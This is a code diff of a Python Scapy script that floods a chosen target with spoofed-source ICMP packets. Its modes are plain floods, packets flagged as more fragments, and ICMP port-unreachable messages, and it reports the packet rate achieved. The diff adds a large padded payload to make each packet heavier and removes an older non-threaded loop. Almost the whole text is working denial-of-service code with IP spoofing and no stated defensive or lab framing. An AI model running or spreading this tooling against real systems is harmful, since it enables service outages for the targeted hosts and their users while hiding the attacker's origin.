@@ -31,11 +31,12 @@ def get_text_total_ips():
 	for j in range ( 0, ( int(n_ips) % len(f_ips) ) ):
 		ips.append(f_ips[j])
 
+load = "suchaload"*162
 def sendPacketFlood(origin_ip):
-	send((IP(dst=dst_ip,src=origin_ip)/ICMP())*int(n_msg), iface=interface, verbose=False)
+	send((IP(dst=dst_ip,src=origin_ip)/ICMP()/load)*int(n_msg), iface=interface, verbose=False)
 
 def sendPacketMF(origin_ip):
-	send((IP(dst=dst_ip, src=origin_ip, flags="MF", proto = 17, frag = 0)/ICMP()/("load"*int(1)))*int(n_msg), iface=interface, verbose=False)
+	send((IP(dst=dst_ip, src=origin_ip, flags="MF", proto = 17, frag = 0)/ICMP()/load)*int(n_msg), iface=interface, verbose=False)
 
 def sendPacketT3(origin_ip):
 	send((IP(dst=dst_ip,src=origin_ip)/ICMP(type=3, code=3))*int(n_msg), iface=interface, verbose=False)
@@ -61,20 +62,6 @@ else:
 	print "Type unknown"
 p.close()
 
-'''
-# Without threading
-count = 0
-while(count < int(n_ips)):
-	count += 1
-	if type == "1":
-		send((IP(dst=dst_ip,src=ips[count%len(ips)])/ICMP()), iface=interface)
-	elif type == "2":
-		send((IP(dst=dst_ip, src=ips[count%len(ips)], flags="MF", proto = 17, frag = 0)/ICMP()/("load"*int(1))), iface=interface)
-	elif type == "3":
-		send((IP(dst=dst_ip,src=ips[count%len(ips)])/ICMP(type=3, code=3)), iface=interface)
-	else:
-		print "Type unknown"
-'''
 total_s = float(time.time() - t0)
 total_p = int(n_ips) * int(n_msg)
 ratio = float(total_p)/float(total_s)
